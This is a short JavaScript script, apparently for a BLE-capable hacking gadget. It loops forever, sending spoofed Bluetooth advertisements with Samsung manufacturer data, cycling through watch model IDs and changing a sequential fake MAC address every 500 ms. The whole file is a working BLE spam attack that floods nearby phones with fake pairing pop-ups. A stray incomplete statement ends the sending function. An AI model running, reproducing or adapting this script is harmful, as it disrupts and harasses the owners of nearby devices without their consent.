let bleBeacon = require("blebeacon");

let currentIndex = 0;
let currentByteValue = 0;
let watchValues = [
    0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
    0x09, 0x0A, 0x0B, 0x0C, 0x11, 0x12, 0x13, 0x14, 0x15,
    0x16, 0x17, 0x18, 0xE4, 0xE5, 0x1B, 0x1C, 0x1D, 0x1E,
    0x20, 0xEC, 0xEF
];

function byteToHex(byte) {
    let hexChars = '0123456789abcdef';
    let hex = '';
    if (byte >= 0 && byte <= 255) {
        hex = hexChars[(byte >> 4) & 0x0F] + hexChars[byte & 0x0F];
    }
    return hex;
}

function getNextByteValue() {
    let value = currentByteValue;
    currentByteValue = (currentByteValue + 1) % 256;
    return value;
}

function generateRandomMac() {
    let mac = '';
    for (let i = 0; i < 6; i++) {
        if (mac.length) mac += ':';
        let byte = getNextByteValue();
        mac += byteToHex(byte);
    }
    return mac;
}

function bytesToHexString(bytes) {
    if (!bytes) {
        print("Invalid input for bytesToHexString");
        return '';
    }

    let hexString = '';
    for (let i = 0; i < bytes.length; i++) {
        hexString += byteToHex(bytes[i]);
    }
    return hexString;
}

function sendRandomModelAdvertisement() {
    if (!watchValues || watchValues.length === 0) {
        print("watchValues array is empty or undefined.");
        return;
    }

    let model = watchValues[currentIndex];

    let packet = [
        14, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43,
        model
    ];

    let packetString = bytesToHexString(packet);
    if (!packetString) {
        print("Failed to generate packet string.");
        return;
    }

    bleBeacon.setMac(generateRandomMac());
    bleBeacon.setData(packetString);
    bleBeacon.send();

    print("Sent data for model ID " + to_string(model));

    currentIndex = (currentIndex + 1) % watchValues.length;

    delay(500);

    bleBeacon.stop();

    bleBeacon
}

while (true)
{
    sendRandomModelAdvertisement();
}